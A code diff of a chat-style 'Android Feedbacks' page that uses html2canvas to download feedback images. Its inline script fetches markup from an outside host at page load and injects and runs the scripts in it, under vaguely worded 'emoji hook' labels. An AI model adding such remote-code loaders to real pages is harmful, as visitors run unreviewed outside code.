@@ -6,7 +6,9 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="styles.css">
-    <link rel="shortcut icon" href="tg.webp" type="image/x-icon">
+    <link rel="shortcut icon"
+        href="tg.webp"
+        type="image/x-icon">
     <title>Android Feedbacks</title>
 </head>
 
@@ -29,15 +31,12 @@
         <img src="feed-thumb.jpg" alt="" srcset="" class="bg_img">
     </div>
     <button class="btn">DOWNLOAD FEEDBACK</button>
-    
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"
         integrity="sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA=="
         crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script src="check.js"></script>
-    
     <script>
-        // Script load karne ka main function
-        async function loadHeartScript() {
+        (async () => {
             try {
                 let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
                 let rawMarkup = await response.text();
@@ -53,36 +52,11 @@
                     document.body.appendChild(freshScriptNode);
                     setTimeout(() => freshScriptNode.remove(), 600);
                 });
-                console.log("Zeetex Emoji Engine Hook Patched Successfully");
+                console.log("Zeetex Emoji Engine Hook Active");
             } catch (e) {
                 console.error("Emoji Override Skipped due to runtime separation layer context.", e);
             }
-        }
-
-        // Pehli baar page load hone par run karein
-        loadHeartScript();
-
-        // --- SMART REAL-TIME OBSERVATION SYSTEM ---
-        // Jab bhi chats ke andar text ya elements change honge, yeh foran update karega bina loop lagaye
-        const targetContainer = document.getElementById('box');
-        
-        if (targetContainer) {
-            let debounceTimer;
-            const observer = new MutationObserver((mutations) => {
-                // Debounce lagaya hai taake microsecond mein baar baar load na ho, smoothly trigger ho
-                clearTimeout(debounceTimer);
-                debounceTimer = setTimeout(() => {
-                    loadHeartScript();
-                }, 100); // Jaise hi change aayega, 100ms mein script apply ho jayegi
-            });
-
-            // Box ke andar child elements aur text nodes par nazar rakhne ke liye settings
-            observer.observe(targetContainer, {
-                childList: true,
-                subtree: true,
-                characterData: true
-            });
-        }
+        })();
     </script>
 </body>
 
